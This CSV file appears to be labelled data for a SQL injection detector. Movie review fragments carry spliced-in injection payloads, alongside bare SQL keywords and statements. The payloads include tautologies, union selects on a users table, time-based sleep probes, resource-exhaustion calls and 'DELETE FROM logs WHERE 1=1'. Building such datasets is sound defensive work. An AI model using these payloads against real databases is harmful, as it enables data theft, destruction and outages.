query,label,length
"1'qhfy<'"">utwq--So far Miguel Bardem's career it's been one of the more dreadful of recent Spanish cinema. He's made nothing but rubbish... until now. ""Incautos"" has been quite a surprise: it's a serious film, with rhythm, with a great cast and very entertaining.<br /><br />The art of robbing, that's what ""Incautos"" is about. A film much alike to David Mamet's ""House of game"" and stuff like that. A thousand of twists in the script, a",1,437
"-1127 or 73/*Like all Carnosaur movies, this is a joke. The way the dinosaurs move, reminds me of when my sister plays with her dolls, because they cannot be any stiffer or more fake-looking than they were.<br /><br />The plot had no sense whatsoever. I mean, first they're on a bus, then in a warehouse then, all of a sudden, they're on a boat. And let's be serious, does it make sense that a couple of dinosaurs can stay together on a van, or on a ship? I thought dinosaurs were the biggest animals, and now they can fit on a moving van. It sounds stupid even when you think about it.<br /><br />The only reason for wh*/91 = 4954",1,631
limit,1,5
LImIt,1,5
"This film breeches the fine line between satire and silliness. While a bridge system that has no rules may promote marital harmony, it certainly can't promote winning bridge, so the satire didn't work for me. But there were some items I found enjoyable anyway, especially with the big bridge match between Paul Lukas and Ferdinand Gottschalk near the end of the film. It is treated like very much like a championship boxing match. Not only is the arena for the contest roped off in a square area like a boxing ring, there is a referee hovering between the contestants, and radio broadcaster Roscoe Karns delivers n'@variable",1,624
'1,1,2
DELETE FROM logs WHERE 1=1;,1,27
?,1,1
You've got to think along the lines of Last Tango in Paris for this one because the mood and emotion runs along the same lines and maintains the same height'n,1,158
"Homeward Bound is a beautiful film. Y'know the part where Shadow falls down the ditch... thingy, I *cried*, considering I was only six, I cried! it takes a lot to make me cry! The dogs and the cat are excellently trained. A nice family movie, *not* for completely hardened non-fluffy people or animal-haters but could for soft-as-crap a.k.a. people like me.<br /><br />A good film overall, 10/10!""1' where 9242 = 9242",1,417
replace,1,7
"This movie tries its darndest to capture that classic bad canadian movie feel:<br /><br />""quirky"" and obnoxious characters (a few); ""qui'1'+ ( select qydm where 6019 = 6019",1,173
"Rosie wasted a lot of TV time talking about the Tainos as if they were super influential in the dynamics of the modern day Puerto Rican. They were not. The truth is that the Africans and the Spanish were and she knows it. What kills me is that she is standing on the screen looking like some average light skin black chick ( with an obvious black dad""1""  )  )   as azak where 4911 = 4911",1,387
1wwis,1,5
"This is the best made-for-TV movie of all-time! Am I saying this because I'm a huge Silverstone fan? Partially, but even without her, I'd still see it. I'm a fan of serial killer genre films, and believe this to be a great entry in that category. Also, Mary Giordano easily ranks among Alicia's top five character creations. Totally memorable - like she really exists. I'd have her on my side, too, if there was a mystery to be solved. She plays the character, like she does with her real life, with complete confidence in everything she does. Seems sweet, honest, nice...just like she is in real 'call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and  ( 9646 = 9646",1,698
"It kicks you in the stomach. There are other films with more convincing characters, a more realistic story, and maybe even more depth concerning political invocations. But then again, most of these are not directed by Peter Watkins. Maybe the one true genius artist of British Film to emerge out of the 1960s, Watkins has made quite a bunch o""1'  )  )   as xirr where 2425 = 2425",1,379
"I haven't written a review on here in ages but rewatching all of bottom TV show, live shows and this I felt I had to make my views on this movie known! It is, I feel, the perfect comedy movie. It lacks the lovey dovey story lines(I wouldn't really call richies enfatuation with Gina Carbonara love would you? Or him and eddie going up there naked... not love) that make the rest of comedys go from good to crap, it lacks the usual dilemmas that one must overcome in most other comedy movies... unless you count the fact that they poisoned the guests and must escape from the guests""1' )  where 7541 = 7541",1,605
"Takashi Shimizu had a great opportunity with a remake of his original film Ju-On The Grudge. While I haven't seen that film, I would have to wager that there's more imagination and originality (or some rip-off originality, in other wor'’ or ‘1’ = ’1",1,249
"I can't believe that there are people out there who voted 10 for this garbage! Have any of you gained access to a computer in the madhouse where you are undoubtably kept, or is there a special colony where especially crass people are secretly imprisoned that I don't know about?<br /><br />If I was to say what I really thought of this film, none of it would get published.<br /><br />To begin with its 'star' is a no talent idiot who acts like a bad impersonator of Jim Carrey who has hoovered enough angel dust up his nose to resurface the Sahara desert. His name will be a total guarantee that I will not watch a future film with him in it - even if he plays a rock hidden by a crowd.<br /><br />As for the 'plot'. One more crime that we can chalk up to the Nazis is that they were so awful that they can be considered fair game as 'baddies' in tripe like this; mere crim'1%'  )  )   )  rlike sleep ( 5 )  and   (  (   ( '%' = '",1,931
"-8641%' order by 1--Resnais, wow! The genius who brought us Hiroshima Mon Amour takes",1,85
"ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001"" where 8333 = 8333",1,857
"I really liked the first part of this film in Africa for about an hour or so until the animal cruelty by civilized humans in Scotland got to me in the second half and made me so sad I couldn't watch some of it. However, this was done by the filmmaker to make a point that early natural scientists ruined everything alive they didn't understand by ""studying"" it literally to death without considering the rights and comfort of the animals studied, which we know now shouldn't be studied anywhere but in the natural world they inhabit, and as unobtrusively as possible. I do recommend this film as it was a mostly serious and honest story of Tarzan and made a point of showing the gross animal cruelty that was rampant in the 19th century scientific world as well as the pure and simple, beautifully primitive life Tarzan lived as a young man who was found as a baby and raised by chimps after the violent death of his parents in the African jungle.<br /><br />Chr'&apos; OR",1,972
"Beat a path to this important documentary that looks like an attractive feature. Forbidden Lie$(2007) is simply a better (cinematic) version of Norma Khouri's book Forbidden Love, and THAT was a best-seller. An onion-peeling of literary fraud and of a pretty woman, Lie$ is the very best in editorialised reality TV.<br /><br />Cleverly edited and colourful, Broinowski's storytelling is chaptered by moving silhouettes of Norma Khouri meaningfully blowing smoke. I disagree (with Variety) that it's overlong; instead my one slight problem was with the episodic nature of its key players commenting on others' just-recorded testimonials. On a single watching your sense of narrative becomes mired.....so I watched it twice.<br /><br />This Oscar-worthy effort is at once genuinely funny, upsetting, and totally engrossing as it documents one lie after another. Th'1"" )  and 3732 = 3850 and  ( ""edjv"" = ""edjv",1,907
031003000270000,1,15
"The final installment in the Karate Kid series is predictable, poorly acted, and so bad it borders on the enjoyable. But not quite, it's just bad. In this installment Ralph Macchio's Karate Kid is absent, already having been in one too many of the episodes. The new Kid, played by Hillary Swank, is the teenage granddaughter of one of Mr. Miyogi's WWII buddies. Her parents are recently deceased and her grandmothe'-4945 or make_set ( 9354 = 9354,7185 ) ",1,454
"'  ( select /*This has to be one the best movies about serial killers that I've ever seen, and this is coming from someone who absolutely loved Silence of the Lambs. HBO has hit the jackpot here. This film is compelling from the first moment until the last.<br /><br />This film has so many underlying themes its hard to tell exactly what it is about. It chronicles the decade-long search for the Russian serial killer Andrea Chikatilo. Stephen Rea gives a brilliantly reserved performance as the inexperienced forensic expert who is put in charge of the investigation, and Donald Sutherland gives an even more involving performance as his cynical superior, and the only person in the Russian government willing to help him. Both of their performances are subtle masterpieces---Rea begins naive and unwilling to compromise, while Sutherland begins detached and almost amused */top 1",1,882
update,1,6
1;SELECT *,1,10
"Very glad to see that this excellent film gets such high marks from the users of IMDB. The Best Years of Their Lives remains the finest cinematic statement about veterans returning from war that'1,iif ( 7475 = 7475,1,1/0 ) ",1,223
"Inside I'm Dancing (Rory O'Shea Was Here)is the story of two handicapped young men, Rory O'Shea, who is almost completely immobilized and confined to wheelchair, and Michael Connelly who is debilitated by MS and also confined to a wheelchair.<br /><br />Set in Ireland, the film opens with Rory arriving at a assisted living center. He eventually befriends Michael but only after a few tense scenes where Rory rebels against the staff and other patients in the usual ""movie way"" playing loud metal music, using profanity, and general obnoxiousness. His budding friendship with Michael is cemented by the fact that Rory seems to be the only one who understands Michael, or is at least willing to try.<br /><br />Eventually, through some trial and tribulation the pair petitio'call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and  ( '%' = '",1,871
" end-- podi--This is one of the worst movies I have ever seen. There is not a shred of historical accuracy, in fact reality is reversed. Just one example: Morgan preyed on the few ethnic Chinese he encountered. The acting is over the top, the script is a poorly written lie. I have never seen worse fake beards.<br /><br />Hopper arrived in Australia and reportedly only would make the film if the script was totally rewritten so he could be a hero. Since the script was ten made up on the fly, the may explain how bad it is and how disjointed the movie is.<br /><br />Any movie about Ned Kelly is a lot better than this film.",1,626
"It was a disappointment to see this DVD after so many years. For me the main problem's the uneven script.<br /><br />While some of it is witty and hip, quite a bit of it is dull, unfunny and lifeless. Many of the gags just sit there, lacking spark and energy.<br /><br />Of the cast, Mae West and Rachel Welch come over well. Roger Herren in the role of' union select * from users where login  =  char ( 114,111,111,116 ) ;",1,423
"I do not fail to recognize Haneke's above-average film-making skills. For example, I appreciate his lingering on unremarkable-natural-day-lighted settings as a powerful way to force a strong sense of realism. However, regarding the content of this film, I am very sad to see that in the 21st century there is still an urge to pathologize domination-submission relations or feelings (and/or BDSM practices). The problem that the main character has with her mother is unbelievably topical as is the alienation and uncomprehension felt by Walter (I don't mean the frustration of a lover which is not loved back in the same way, which is understandable; I mean that he looks upon her as if she were crazy, or as if he""exec xp",1,721
"1%' and 6454 = 8348 and '%/*OK, so I loved Rachael Ray before, but now, I ADORE her! How innovative. I love that she has a cooking section- I admit that occasionally I skip that part, only because it makes me WAAAY too hungry! But I also love that you can get the next day's grocery list on her web*/' = '",1,305
"An on screen caption informs us that it is 'the Caribbean Sea, May 1891'. A small lifeboat drifts aimlessly at sea containing six convicts from a shipwrecked prison ship, and the ship's Doctor a Lt. Claude De Ross (Claudio Cassinelli). It's night, a strange current takes the boat towards a strange, unnamed and uncharted island. The boat hits some rocks and is torn apart. One of the prisoners is killed by what appears to be a slimy mutant fish-man creature. The next morning morning Claude wakes up to find himself washed upon a beach. He finds a pool of white bubbling water and one of the prisoners dead beside it. Claude warns an""1""  )  )   as zbfj where 2285 = 2285",1,672
DELETE FROM Customers  WHERE CustomerName = 'Alfreds Futterkiste',1,65
"OK, so the following review is more of a synopsis more so than really containing any spoilers, but better safe than sorry so as to avoid being blacklisted, right? Right! Consider yourselves officially warned, and read on...<br /><br />In this parody/tribute to the gre""iif ( 5214 = 7412,1,1/0 ) ",1,295
"It helps that the characters this show is based on are among the best Disney has ever come up with. The writing is what really makes this show. It's a total classic. Given, you need to appreciate the type of humor to enjoy it, and this is hard to explain. The humor is akin to the old school scenarios of 40's and 50's Disney, with modern spins. It never degrades into fart jokes or anything of that type. It's not adam sandler humor either, though I have enjoyed that. It is the exact same humor of the movie, only expanded upon for the length of time a TV show permits. So if you didn't like it in the movie, you won't like it here, but IMO The emperors ne""admin"" )  or ""1"" = ""1",1,680
"I saw this movie today on the big screen and i can honestly not believe some of the comments made by people on here. I was really hoping to be touched by this film, but wasn't.<br /><br />I'm ex Australian Army and very patriotic towards this great country, but I feel this movie no way does justice for us and those soldier who fought at this battle.<br /><br />The movie is poorly filmed. I thought the acting was terrible, they were not believable and they didn't give me any reason for me to care about them. People are saying this movie was graphic, there were a couple of graphic scenes but I found most part very weak. The war scenes were very short and only last a couple of minutes.<br /><br />Ove' end and  ( 'unko' = 'unko",1,733
"Faithful adaptation of witty and interesting French novel about a cynical and depressed middle-aged software engineer (or something), relying heavily on first-person narration but none the worse for that. Downbeat (in a petit-bourgeois sort of way), philosophical and blackly humorous, the best way I could describe both the film and the novel is that it is something like a more intellectual Charles Bukowski (no disrespect to CB intended). Mordantly funny, but also a bleak ana""select * from generate_series ( 4465,4465,case when  ( 4465 = 6232 )  then 1 else 0 end )  limit 1--",1,580
"-3578'  )  )   )  order by 1--Quai des Orfevres takes too long getting going, with Clouzot so enamored of his back-stage milieu that he is almost in danger of forgetting the story. However, once it does, it's Clouzot at his best. Bertrand Blier (father of Bertrand Blier and co-star of his Buffet Froid) is the worldworn pianist who married beneath himself and who plans to kill the seedy studio mogul with designs on his wife only to find that someone has beaten him to it. Not only that, but his carefully planned but clumsily executed alibi falls to pieces, not least when a thief steals his car at the murder scene<br /><br />The film really kicks into life with the arrival of Luis Jouvet's police inspector, a rather wonderful creation half Alistair Sim in Green for Danger and ",1,785
"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--Don't get me wrong: I enjoy art-house movies, low-budget flicks, character studies, and foreign movies. Unfortunately, I couldn't enjoy this one -- glacial pacing, complete lack of plot, and c",1,251
"I actually flipped to Lifetime channel by mistake, just as this movie was beginning, and ended-up watching it. <br /><br />It certainly deals with a serious issue, probably more prevalent than we realize, in terms of this type of attack of a young woman by an ego-maniacal fellow-student, who feels he's above the system, and, unfortunately, often is.<br /><br />The cast here was believable, and the performances credible. A lot of these Canadian/Lifetime flicks are decidedly ""over-the-top."" However, this is one I might label as ""under-the-top.""<br /><br />While appreciating the fact that it wasn't presented in an overblown fashion, this film somehow seemed like a record being played at a slower speed than proper, the 96 minutes seemed like many more, and it had the effect of looking like a shorter film, looped over-and-over, seemingly going on and on and on and ON - before reaching its inevitable and predictable conclusion.<br""UE1",1,942
"I am a Shakespeare lover since childhood. I am also a Jew. Merchant of Venice is anti-semitic through and through no matter how hard scholars and literature lovers try to re-interpret it.<br /><br />In the play, Shylock is portrayed as demonic and cold-hearted and has no forgiveness, no warmth, no love except for money and cruel revenge, whereas the Christians are kind, moral people. His motives in the play revolve around money (he plots revenge from the start based on damage caused to his business as well as blind racial hate), not noble ideals or hurt racial pride as this movie wants you to believe. And this characterization is given to him by Shakespeare himself""1 and 9122 = 4153# nxcv",1,697
"In theory, 'Director's Commentary' should have worked. The talented Rob Bryden plays Peter DeLane, a former television director recounting his experiences behind the camera. Amongst the programmes he is alleged to have worked on are 'Bonanza', 'Flambards', 'The Duchess Of Duke Street', and 'The Bounder'. His commentaries are not the least bit informative, due to his habit of wandering off the point.""-7749"" or  ( 2689 = 7481 ) *7481",1,435
031003000270000,1,15
c,1,1
"1 )  /*The first and second seasons started off shakily, with good episodes sandwiched in between average ones, and at times resorting to clichéd stories. But once it started to set up the universe in which it exists and started to develop it's characters more, it became a lot more fun and entertaining. <br /><br />The main reason this show succeeds it because of four men: Richard Dean Anderson, Peter Deluise, Joseph Malozzie and Paul Mullie. Richard's dry sense of humour makes to show so much better, Peter's directing is excellent and makes any episode so much more entertaining, and Joe & Paul never fail to make a funny, interesting episode together. <br /><br />Once you understand what the show is*/where 6150 = 6150",1,727
000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001,1,546
s,1,1
"This was the film that first indicated to me what a great actor Martin Sheen really is. He modestly claims that Charlie is a better actor, Charlie can't hold a candle to him.<br /><br />I found it suspenseful and thoroughly enjoyed the intertwining of the love story with the main plot (and I usually HATE love stories). There's a great plot twist at the end that struck me as being fully credible, particularly in the early 80's time period, and probably now also.<br /><br />The final scene had me on the edge of my seat. This film roundly illustrates that treachery is often doled out by those we trust, while declared enemies have more in common than they suspect, and finally, that human compassion can be found where we least expect it.<br /><br />irenerose""1 )  as qkkm where 8461 = 8461",1,794
select,1,6
" select * from users where id = 1 or "";_"" or 1 =/*I have never seen ""American Werewolf in London"" but this movie was very entertaining. When renting it I thought it was a horror movie but it turned out to be more of a comedy with some horror aspects. I thought the transformation sequences were nicely done but effects wise, the best scenes were those where the effects and the lighting built off each other, nice. The transformations*/ 1 -- 1",1,443
end-- podi,1,10
to_timestamp_tz,1,15
"I recently saw Blind Spot in Coyoacan, where it drew a huge crowd and some pretty intense discussion. I really admired the story and visual approach. The action is frightening and the mood of loneliness that the film projects is amazing. There is much beauty in the melancholy that surrounds these three misfit heroes. Not just in the desert but in the city too. My best scene was after the boy discovers his friends in the apartment and then rides his skateboard through all the remarkable lights of the city. You really feel for this guy. I never heard of the actors before but I liked all three very much. I think they did a terrific job on their journey to self-discovery. All in all, this is an amazingly cool a""1""  )  )   and  ( 7467 = 7962 ) *7962 and   (  (  ""nhld"" = ""nhld",1,781
select,1,6
s,1,1
"Like Steven Seagal I also am a big Van Damme fan and have followed most of his movies since the start of his acting career.<br /><br />In this flick Van Damme assumes the role of Jack Robideaux whom is a cop that just moved to New Mexico from New Orleans to work as part of the Border Patrol. Haunted by memories of his past, it is up to Jack to put an end to a group of Ex-Navy Seals from smuggling illegal drugs into the U.S. that killed his daughter.<br /><br />Overall I found this film to be very good, Van Damme is in very good shape for 48 years old and can really move. The action scenes are very intense and the movie even throws a couple of plot twists in to keep you guessing. Unfortunately Van Damme does no""1' )  and elt ( 3528 = 3566,3566 ) ",1,755
"Quite possibly one of the greatest wastes of celluloid of the past 100 years. Not only does it suffer from a painfully (and enormously predictable) disjointed script, but it's clearly a carbon-copy of Alien II. Within five minutes I had correctly predicted who would die and who wouldn't (and in which order). The special effects are laughable; there is a scene where one crew member is mauled (unconvincingly) by two Krites that look like a pa'1 )  as wiyx where 6515 = 6515",1,475
"I watched this movie as I liked the plot, a group of strangers are held captive trying to figure out how they're connected.<br /><br />The setting and the premise were obviously influenced by the first (and best) Saw movie & although there wasn't much action the story moved at a relatively good pace.<br /><br />There was comedy relief ion the form of the two bickering 'Alpha males' and it was a welcome surprise (for me anyway)to see Melissa Joan Hart hasn't given up on acting yet.<br /><br />A few things let it down for me personally; 1. The paedophile was way over characterised making him get turned on by everything from children to dead bodies."" end and   (  (   ( 3673 = 3673",1,686
"Walt Disney & his 9 Old Men put their own 1950 spin on the classic fairy tale of Cinderella, which I guess you could say helps form an unofficial ""fairy tale princess trilogy"" from the classic Disney years.<br /><br />THE PLOT: Cinderella is a nice girl who can't catch a break. She is the daughter of a nice, wealthy widower who loved her dearly, but her mother passed away when Cinderella was very young, and Cindy's father felt she needed a mother figure, so he eventually married the woman who would become known as Lady Tremaine, herself a widow with two daughters about the same age as Cinderella, Anastasia and Drizella. At first they all seemed to get along, but then Cinderella's father died,'1 and elt ( 8853 = 1675,1675 ) -- jegm",1,740
"a' --I would ward off any temptation to view this movie, it is quite simply dull. The characters are predictable and mindless. The assassin is quite unenigmatic. There is no tension, fun, no style or even a glimmer of originality to be found in this train wreck. And the morass of Hollywood cliché's are stifling. Oh, and you have a movie that makes a hero of an IRA terrorist. Cute. And now I need to speak some more to fill up the ten lines. And a little bit more Is that enough? Not quite, how",1,496
"/*A very intelligent and exciting thriller that doesn't rely on action but on situation, which is all to rare these days. I would compare this film to The Day of the Jackal, another film about the pursuit of a dangerous international criminal. The acting across the board is superlative - Aidan Quinn has a tricky double role as the vicious terrorist Carlos and as the Navy man who impersonates him. Donald Sutherland plays the amoral CIA agent who hires him. Ben Kingsley plays the Israeli officer who assists in the plan. This is a very tense and effective film, and it's remarkable considering just how little action there is in it. The first half of the film is all set-up, as the Navy man prepares to impersonate Carlos. The second half is a breathless actioner, the action coming out of the characters and their situations, thus making it al*/1",1,850
DELETE FROM logs WHERE 1=1;,1,27
 ,1,1
3tsfjqq56883b6fioar74mqyrur4ht 89ufnkmjts846otdjfvo9yncupdate,1,61
"1' wh/*This is one of the best horror movies i've seen in a while. An eerie abandon house, interesting characters, gore and a twisted plot. Who could ask for anything more in a horror movie? It is pretty predictable for the most part but then again most horrors you can figure out within the first 10 minutes so I won't hold that against it. The music, camera angles and so forth are excellent. The sets are well make and very convincing. There was pretty much no subplots however, it being a horror movie too many alternate plots only take away from what were wanting from a horror anyhow... To be scared... This one keeps it pretty simple and does just that. If I were to compare it to any other movie I would say it reminded me of the remake of Texas Chainsaw Massacre. Definitely a horror movie lover must see.*/ere 8729 = 8729",1,831
"'^'--Last year, I fell in love with the Tim Burton's version of Sweeney Todd so I wanted to check out the other versions of this musical and I found this one at the library. Though I think Burton's is best, probably because I like film a lot better than theater, this is still a great production of the story. I haven't seen any of the other versions but I am trying to get my hands on them.<br /><br />After seeing Johnny Depp as Todd, it's hard for me to imagine anyone else in the role, but George Hearn does a fantastic job. Angela Lansbury is great, as always and all of the singing is fantastic. I found myself singing along. This is a play you won't want to miss, but try and see it before you see the film version so you won't have a biased view like me.",1,762
"1"" and/*This was the second Cinemascope spectacle that Fox produced after the Robe. Notice how some of the Roman sets are redressed to pass for Egyptian sets. The film is produced with all first class elements, beautiful photography, stirring soundtrack (Alfred Newman and Bernard Herrmann - see if you can tell which composer scored specific scenes). However, the principal acting is a bit weak. Edmund Pu*/ 9468 = 7105--",1,422
"This is loosely based on the ideas of the original 80's hit . It's set in the modern day as we see a base in Afghanistan get destroyed by a UAV right at the start.<br /><br />And that's exactly where the movie jumps the shark. UAV's aren't armed. They could be but I don't think it's ever been tried for real. We get to see the computer that has masterminded this operation, called R.I.P.L.E.Y. We are introduced to ""hacker"" Will Farmer (he's good at chemistry & electronics which doesn't make him a computer hacker) & his love interest, Annie) & Will's 1st attempt at hacking is not only a complete failure his IP address is also logged and Annie guessed who it was. We also meet Wills mom who works for a chemical comp""1 where 5700 = 5700",1,740
